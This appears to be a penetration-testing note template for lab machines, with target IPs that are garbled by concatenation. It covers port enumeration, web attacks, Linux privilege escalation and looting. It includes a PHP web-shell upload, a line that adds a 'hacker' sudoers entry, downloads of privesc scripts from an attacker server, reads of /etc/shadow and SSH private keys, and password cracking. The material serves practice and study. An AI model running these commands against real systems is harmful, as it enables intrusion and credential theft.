## Info-sheet

- DNS-Domain name:
- Host name:
- OS:
- Server:
- Kernel:
- Workgroup:
- Windows domain:

Services and ports:

Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-09 17:11 +0630
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.49 seconds


## Recon


```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS 10.10.10.8710.10.10.102

# Scan all ports, might take a while.
nmap 10.10.10.8710.10.10.102 -p-

# Service-version, default scripts, OS:
nmap 10.10.10.8710.10.10.102 -sV -sC -O -p 111,222,333

# Scan for UDP
nmap 10.10.10.8710.10.10.102 -sU
unicornscan -mU -v -I 10.10.10.8710.10.10.102

# Connect to udp if one is open
nc -u 10.10.10.8710.10.10.102 48772

# Monster scan
nmap 10.10.10.8710.10.10.102 -p- -A -T4 -sC
```


### Port 21 - FTP

- FTP-Name:
- FTP-version:
- Anonymous login:

INSERTFTPTEST


```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.8710.10.10.102
```

### Port 22 - SSH

- Name:
- Version:
- Takes-password:
- If you have usernames test login with username:username

INSERTSSHCONNECT

```
nc 10.10.10.8710.10.10.102 22
```

### Port 25

- Name:
- Version:
- VRFY:

INSERTSMTPCONNECT


```
nc -nvv 10.10.10.8710.10.10.102 25
HELO foo<cr><lf>

telnet 10.10.10.8710.10.10.102 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.8710.10.10.102
```

### Port 69 - UDP - TFTP

This is used for tftp-server.


### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

```
telnet 10.10.10.8710.10.10.102 110
USER pelle@10.10.10.8710.10.10.102
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```
rpcinfo -p 10.10.10.8710.10.10.102
```


### Port 135 - MSRPC

Some versions are vulnerable.

### Port 143 - Imap

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.10.10.8710.10.10.102 -p 445


enum4linux -a 10.10.10.8710.10.10.102
rpcclient -U "" 10.10.10.8710.10.10.102
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L 10.10.10.8710.10.10.102
smbclient //10.10.10.8710.10.10.102/tmp
smbclient \\\\10.10.10.8710.10.10.102\\ipc$ -U john
smbclient //10.10.10.8710.10.10.102/ipc$ -U john  
```


### Port 161/162 UDP - SNMP

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.10.10.8710.10.10.102
snmp-check -t 10.10.10.8710.10.10.102 -c public
```

```
# Common community strings
public
private
community
```


### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

## Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h 10.10.10.8710.10.10.102
tnscmd10g status -h 10.10.10.8710.10.10.102
```

### Port 2049 - NFS

```
showmount -e 10.10.10.8710.10.10.102

If you find anything you can mount it like this:

mount 10.10.10.8710.10.10.102:/ /tmp/NFS
mount -t 10.10.10.8710.10.10.102:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm


### 3306 - MySQL

- Name:
- Version:

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.10.10.8710.10.10.102 -p 3306

mysql --host=10.10.10.8710.10.10.102 -u root -p
```

### Port 3339 - Oracle web interface


- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

### Port 80 - Web server

- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:


INSERTCURLHEADER

- Web application (ex, wordpress, joomla, phpmyadmin)
- Name:
- Version:
- Admin-login:


```
# Nikto
nikto -h http://10.10.10.8710.10.10.102

# Nikto with squid proxy
nikto -h 10.10.10.8710.10.10.102 -useproxy http://10.10.10.8710.10.10.102:4444

# CMS Explorer
cms-explorer -url http://10.10.10.8710.10.10.102 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.10.10.8710.10.10.102
wpscan --url http://10.10.10.8710.10.10.102 --enumerate vp
wpscan --url http://10.10.10.8710.10.10.102 --enumerate vt
wpscan --url http://10.10.10.8710.10.10.102 --enumerate u

# Joomscan
joomscan -u  http://10.10.10.8710.10.10.102 
joomscan -u  http://10.10.10.8710.10.10.102 --enumerate-components

# Get header
curl -i 10.10.10.8710.10.10.102

# Get everything
curl -i -L 10.10.10.8710.10.10.102

# Check for title and all links
curl 10.10.10.8710.10.10.102 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.10.10.8710.10.10.102 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.10.10.8710.10.10.102/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.10.10.8710.10.10.102/test/shell.php

dotdotpwn.pl -m http -h 10.10.10.8710.10.10.102 -M GET -o unix
```

#### Nikto scan


INSERTNIKTOSCAN


#### Url brute force

```
# Not recursive
dirb http://10.10.10.8710.10.10.102 -r -o dirb-10.10.10.8710.10.10.102.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://10.10.10.8710.10.10.102 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

INSERTDIRBSCAN


#### Default/Weak login

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```


#### LFI/RFI




```
fimap -u "http://10.10.10.8710.10.10.102/example.php?test="

# Ordered output
curl -s http://10.10.10.8710.10.10.102/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://10.10.10.8710.10.10.102/example.php?page=
```

#### SQL-Injection

```
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.10.10.8710.10.10.102/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.10.10.8710.10.10.102 --dbms=mysql --crawl=3
```

#### Sql-login-bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation


### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

Heartbleed:

```
# Heartbleed
sslscan 10.10.10.8710.10.10.102:443
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.

### To try - List of possibilies
Add possible exploits here:



### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```



----------------------------------------------------------------------------



'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''



-----------------------------------------------------------------------------



## Privilege escalation

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs


### To-try list

Here you will add all possible leads. What to try.


### Useful commands

```
# Spawning shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard


# Writable directories
/tmp
/var/tmp


# Add user to sudoers
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```


### Basic info

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

**Users with login:**

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts


upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

### Kernel exploits

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
find / -perm -u=s -type f 2>/dev/null
```


### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


### Bad path configuration

Require user interaction





------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT ----------------------




------------------------------------------------------------------------


## Loot

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Proof

```
/root/proof.txt
```

### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

## How to replicate:
